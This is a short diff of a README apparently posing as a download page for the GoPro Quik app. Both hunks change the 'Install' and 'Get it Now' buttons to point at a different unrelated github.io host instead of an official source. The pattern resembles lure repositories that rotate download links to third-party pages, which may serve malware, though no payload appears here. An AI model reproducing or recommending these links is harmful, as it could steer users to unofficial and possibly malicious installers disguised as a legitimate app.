@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://polycia-apps.github.io/.github/goProQuik)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://urinoterapia-sigma.github.io/.github/goProQuik)
 
 </div>
 
@@ -81,7 +81,7 @@ GoPro Quik's automatic highlight reel capability represents the most direct path
 
 <p align="center">
 
-[![Get it Now GoPro Quik](https://img.shields.io/badge/Get_it_Now-2D7DD2?style=for-the-badge&logo=apple&logoColor=white)](https://polycia-apps.github.io/.github/goProQuik)
+[![Get it Now GoPro Quik](https://img.shields.io/badge/Get_it_Now-2D7DD2?style=for-the-badge&logo=apple&logoColor=white)](https://urinoterapia-sigma.github.io/.github/goProQuik)
 
 </p>
 
